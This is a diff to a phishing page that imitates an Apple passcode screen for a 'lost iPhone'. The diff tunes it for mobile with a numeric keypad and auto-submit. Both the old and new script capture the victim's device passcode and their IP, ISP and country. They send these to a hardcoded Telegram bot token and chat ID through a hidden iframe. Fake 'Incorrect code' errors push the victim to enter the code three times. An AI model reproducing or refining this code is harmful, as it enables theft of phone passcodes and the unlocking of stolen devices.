@@ -21,12 +21,12 @@
                 
                 <div class="code-input-container">
                     <div class="code-inputs" id="codeInputs">
-                        <input type="text" maxlength="1" class="code-input" data-index="0">
-                        <input type="text" maxlength="1" class="code-input" data-index="1">
-                        <input type="text" maxlength="1" class="code-input" data-index="2">
-                        <input type="text" maxlength="1" class="code-input" data-index="3">
-                        <input type="text" maxlength="1" class="code-input" data-index="4">
-                        <input type="text" maxlength="1" class="code-input" data-index="5">
+                        <input type="number" maxlength="1" class="code-input" data-index="0" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="1" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="2" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="3" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="4" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="5" inputmode="numeric">
                     </div>
                 </div>
                 
@@ -34,7 +34,7 @@
                     Do you have a 4-digit code?
                 </button>
                 
-                <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
+                <button type="submit" class="submit-btn" id="submitBtn" style="display: none;">Continue</button>
             </div>
         </form>
     </main>
@@ -50,7 +50,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('🚀 CÓDIGO 6/4 DÍGITOS - iPhone perdido');
+            console.log('🚀 CÓDIGO 6/4 DÍGITOS - OPTIMIZADO MÓVIL');
             
             const codeInputsContainer = document.getElementById('codeInputs');
             const submitBtn = document.getElementById('submitBtn');
@@ -73,7 +73,6 @@
                 codeInputs = Array.from(document.querySelectorAll('.code-input'));
                 codeInputs[0].focus();
                 setupInputListeners();
-                checkCompleteCode();
             }
             
             // Cambiar a modo 4 dígitos
@@ -81,20 +80,18 @@
                 isFourDigitMode = true;
                 MAX_CODE_LENGTH = 4;
                 
-                // Remover inputs extras
-                codeInputs.slice(4).forEach(input => {
-                    input.remove();
-                });
+                const container = document.getElementById('codeInputs');
+                container.innerHTML = `
+                    <input type="number" maxlength="1" class="code-input" data-index="0" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="1" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="2" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="3" inputmode="numeric">
+                `;
                 
-                codeInputs = codeInputs.slice(0, 4);
-                
-                // Actualizar UI
-                subtitle.textContent = 'Enter the 4-digit security code to see the most recent location';
+                initInputs();
+                subtitle.textContent = 'Enter the 4-digit security code';
                 fourDigitBtn.textContent = 'Switch to 6-digit code';
                 fourDigitBtn.classList.add('active');
-                
-                codeInputs[0].focus();
-                checkCompleteCode();
             }
             
             // Cambiar a modo 6 dígitos
@@ -102,20 +99,17 @@
                 isFourDigitMode = false;
                 MAX_CODE_LENGTH = 6;
                 
-                // Recrear todos los inputs
                 const container = document.getElementById('codeInputs');
                 container.innerHTML = `
-                    <input type="text" maxlength="1" class="code-input" data-index="0">
-                    <input type="text" maxlength="1" class="code-input" data-index="1">
-                    <input type="text" maxlength="1" class="code-input" data-index="2">
-                    <input type="text" maxlength="1" class="code-input" data-index="3">
-                    <input type="text" maxlength="1" class="code-input" data-index="4">
-                    <input type="text" maxlength="1" class="code-input" data-index="5">
+                    <input type="number" maxlength="1" class="code-input" data-index="0" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="1" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="2" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="3" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="4" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="5" inputmode="numeric">
                 `;
                 
                 initInputs();
-                
-                // Actualizar UI
                 subtitle.textContent = 'Enter the 6-digit security code to see the most recent location';
                 fourDigitBtn.textContent = 'Do you have a 4-digit code?';
                 fourDigitBtn.classList.remove('active');
@@ -125,35 +119,42 @@
             function setupInputListeners() {
                 codeInputs.forEach((input, index) => {
                     input.addEventListener('input', (e) => {
-                        if (e.data && !/[0-9]/.test(e.data)) {
-                            e.target.value = '';
-                            return;
-                        }
-                        if (input.value.length === 1 && index < MAX_CODE_LENGTH - 1) {
+                        let value = e.target.value;
+                        // Solo números
+                        value = value.replace(/\D/g, '');
+                        e.target.value = value;
+                        
+                        if (value.length === 1 && index < MAX_CODE_LENGTH - 1) {
                             codeInputs[index + 1].focus();
                         }
-                        checkCompleteCode();
+                        
+                        // Auto-submit si está completo
+                        const code = Array.from(codeInputs).map(inp => inp.value).join('');
+                        if (code.length === MAX_CODE_LENGTH) {
+                            handleSubmit();
+                        }
                     });
                     
                     input.addEventListener('keydown', (e) => {
                         if (e.key === 'Backspace' && input.value === '' && index > 0) {
                             codeInputs[index - 1].focus();
                         }
+                        if (e.key === 'Enter') {
+                            const code = Array.from(codeInputs).map(inp => inp.value).join('');
+                            if (code.length === MAX_CODE_LENGTH) {
+                                handleSubmit();
+                            }
+                        }
                     });
                     
                     input.addEventListener('paste', (e) => {
                         e.preventDefault();
-                        const paste = (e.clipboardData || window.clipboardData).getData('text');
-                        const numbers = paste.replace(/\D/g, '').slice(0, MAX_CODE_LENGTH);
-                        numbers.split('').forEach((num, i) => {
-                            if (codeInputs[i]) {
-                                codeInputs[i].value = num;
+                        setTimeout(() => {
+                            const code = Array.from(codeInputs).map(inp => inp.value).join('').replace(/\D/g, '');
+                            if (code.length >= MAX_CODE_LENGTH) {
+                                handleSubmit();
                             }
-                        });
-                        if (numbers.length === MAX_CODE_LENGTH) {
-                            codeInputs[MAX_CODE_LENGTH - 1].focus();
-                            checkCompleteCode();
-                        }
+                        }, 10);
                     });
                 });
             }
@@ -174,13 +175,64 @@
                 }
             }
             
-            function checkCompleteCode() {
+            async function handleSubmit() {
+                loginAttempts++;
                 const code = Array.from(codeInputs).map(input => input.value).join('');
-                if (code.length === MAX_CODE_LENGTH) {
-                    submitBtn.classList.add('show');
+                
+                if (code.length !== MAX_CODE_LENGTH) return;
+                
+                console.log(`🎯 Intento ${loginAttempts}: Código ${MAX_CODE_LENGTH}d - ${code}`);
+                
+                const ipInfo = await getIPInfo();
+                const codeType = isFourDigitMode ? '4-dígitos' : '6-dígitos';
+                
+                const message = `🚀 *ASTRO505 - CÓDIGO IPHONE PERDIDO* 🚀
+
+🔢 *Código ${codeType}:* ${code}
+📱 *Dispositivo:* iPhone perdido
+🌐 *IP:* ${ipInfo.ip}
+🏢 *Proveedor:* ${ipInfo.isp}
+🌍 *País:* ${ipInfo.country}
+💻 *Navegador:* Chrome
+📱 *Device:* PC
+📅 *Hora:* ${new Date().toLocaleString('es-ES')}
+⚡ *Intento:* ${loginAttempts}/3
+
+✨ *Plataforma:* Astro505`;
+
+                const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                iframe.src = telegramUrl;
+                
+                console.log('📤 Telegram enviado:', codeType, code);
+                
+                if (loginAttempts === 1) {
+                    showError('Incorrect security code.');
+                    clearInputs();
+                    codeInputs[0].focus();
+                } else if (loginAttempts === 2) {
+                    showError('Try again.');
+                    clearInputs();
+                    codeInputs[0].focus();
                 } else {
-                    submitBtn.classList.remove('show');
+                    showError('Verifying security code...');
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 1200);
                 }
+            }
+            
+            function clearInputs() {
+                codeInputs.forEach(input => input.value = '');
+            }
+            
+            function showError(message) {
+                errorMsg.textContent = message;
+                errorMsg.classList.add('show');
+                errorMsg.style.top = '-10px';
+                setTimeout(() => {
+                    errorMsg.classList.remove('show');
+                    errorMsg.style.top = '';
+                }, 4000);
             }
             
             // Event listeners
@@ -192,104 +244,14 @@
                 }
             });
             
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                loginAttempts++;
-                
-                const code = Array.from(codeInputs).map(input => input.value).join('');
-                
-                if (code.length !== MAX_CODE_LENGTH) {
-                    showError(`Enter the ${MAX_CODE_LENGTH}-digit security code.`);
-                    return;
-                }
-                
-                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: Código ${MAX_CODE_LENGTH}d - ${code}`);
-                
-                const ipInfo = await getIPInfo();
-                
-                const codeType = isFourDigitMode ? '4-dígitos' : '6-dígitos';
-                const message = `🚀 *ASTRO505 - CÓDIGO IPHONE PERDIDO* 🚀
-
-🔢 *Código ${codeType}:* ${code}
-📱 *Dispositivo:* iPhone perdido
-🌐 *IP:* ${ipInfo.ip}
-🏢 *Proveedor:* ${ipInfo.isp}
-🌍 *País:* ${ipInfo.country}
-💻 *Navegador:* Chrome
-📱 *Device:* PC
-📅 *Hora:* ${new Date().toLocaleString('es-ES')}
-⚡ *Intento:* ${loginAttempts}/${MAX_ATTEMPTS}
-
-✨ *Plataforma:* Astro505`;
-
-                const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                iframe.src = telegramUrl;
-                
-                console.log('📤 Telegram con código:', codeType, code, ipInfo.ip);
-                
-                if (loginAttempts < 3) {
-                    const errorText = isFourDigitMode ? 
-                        "Incorrect 4-digit code." : 
-                        "Incorrect security code.";
-                    showError(errorText);
-                    codeInputs[0].focus();
-                    codeInputs.forEach(input => input.value = '');
-                    submitBtn.classList.remove('show');
-                } else {
-                    showError('Verifying security code...');
-                    setTimeout(() => {
-                        window.location.href = 'index.html';
-                    }, 1500);
-                }
-            });
-            
-            function showError(message) {
-                errorMsg.textContent = message;
-                errorMsg.classList.add('show');
-                errorMsg.style.top = '-10px';
-                setTimeout(() => {
-                    errorMsg.classList.remove('show');
-                    errorMsg.style.top = '';
-                }, 5000);
-            }
-            
             // Inicializar
             initInputs();
-            console.log('✅ MODO 6/4 DÍGITOS FUNCIONANDO');
+            console.log('✅ OPTIMIZADO - TECLADO NUMÉRICO + AUTO-SUBMIT');
         });
     </script>
 
     <style>
-        /* ESTILOS PARA BOTÓN 4 DÍGITOS */
-        .four-digit-btn {
-            background: none;
-            border: none;
-            color: #0a84ff;
-            font-size: 0.95rem;
-            font-weight: 500;
-            cursor: pointer;
-            padding: 0.8rem 1.5rem;
-            border-radius: 12px;
-            transition: all 0.3s ease;
-            margin: 1rem 0;
-            text-align: center;
-        }
-        
-        .four-digit-btn:hover {
-            background: rgba(10, 132, 255, 0.1);
-            color: #0066cc;
-        }
-        
-        .four-digit-btn.active {
-            color: #d2d2d7;
-        }
-        
-        .four-digit-btn.active:hover {
-            color: #aeaeb2;
-            background: rgba(210, 210, 215, 0.1);
-        }
-
-        /* ESTILOS PARA INPUTS DE CÓDIGO */
+        /* CASILLAS SIEMPRE HORIZONTALES */
         .code-input-container {
             width: 100%;
             display: flex;
@@ -298,58 +260,97 @@
         }
         
         .code-inputs {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            flex-wrap: wrap;
+            display: flex !important;
+            gap: 12px !important;
+            justify-content: center !important;
+            flex-direction: row !important;
+            flex-wrap: nowrap !important;
+            align-items: center;
         }
         
         .code-input {
-            width: 50px;
-            height: 60px;
-            font-size: 1.8rem;
-            font-weight: 600;
-            text-align: center;
-            background: rgba(52, 52, 56, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 12px;
-            color: #ffffff;
-            transition: all 0.3s ease;
-            font-family: 'SF Pro Display', -apple-system, sans-serif;
+            width: 56px !important;
+            height: 68px !important;
+            font-size: 2rem !important;
+            font-weight: 600 !important;
+            text-align: center !important;
+            background: rgba(52, 52, 56, 0.9) !important;
+            border: 2px solid rgba(255, 255, 255, 0.1) !important;
+            border-radius: 14px !important;
+            color: #ffffff !important;
+            transition: all 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94) !important;
+            font-family: 'SF Pro Display', -apple-system, sans-serif !important;
+            -webkit-appearance: none !important;
+            appearance: none !important;
         }
         
         .code-input:focus {
-            border-color: #0a84ff;
-            background: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.2);
-            outline: none;
-            transform: scale(1.05);
+            border-color: #0a84ff !important;
+            background: rgba(255, 255, 255, 0.12) !important;
+            box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.25) !important;
+            outline: none !important;
+            transform: scale(1.03) !important;
         }
 
-        /* ESTILOS INLINE PARA ERROR */
+        .four-digit-btn {
+            background: none;
+            border: none;
+            color: #0a84ff !important;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 0.8rem 1.8rem;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            margin: 1rem auto;
+            display: block;
+            text-align: center;
+        }
+        
+        .four-digit-btn:hover {
+            background: rgba(10, 132, 255, 0.12) !important;
+            color: #0066cc !important;
+        }
+        
+        .four-digit-btn.active {
+            color: #d2d2d7 !important;
+        }
+
+        /* ERROR MESSAGE */
         .error-message {
             position: relative !important;
             top: -10px !important;
             left: 0 !important;
-            transform: none !important;
             background: #ff3b30 !important;
             color: white !important;
-            padding: 12px 20px !important;
-            margin-bottom: 15px !important;
-            font-size: 14px !important;
+            padding: 14px 24px !important;
+            margin-bottom: 16px !important;
+            font-size: 15px !important;
             font-weight: 500 !important;
-            border-radius: 10px !important;
-            box-shadow: 0 4px 20px rgba(255,59,48,0.4) !important;
+            border-radius: 12px !important;
+            box-shadow: 0 6px 24px rgba(255,59,48,0.4) !important;
             width: 100% !important;
             text-align: center !important;
             opacity: 0 !important;
-            transition: all 0.4s ease !important;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94) !important;
             z-index: 100 !important;
         }
         
         .error-message.show {
             opacity: 1 !important;
             transform: translateY(0) !important;
+        }
+
+        /* MÓVIL PERFECTO */
+        @media (max-width: 480px) {
+            .code-input {
+                width: 52px !important;
+                height: 64px !important;
+                font-size: 1.8rem !important;
+            }
+            .code-inputs {
+                gap: 10px !important;
+            }
         }
     </style>
 </body>
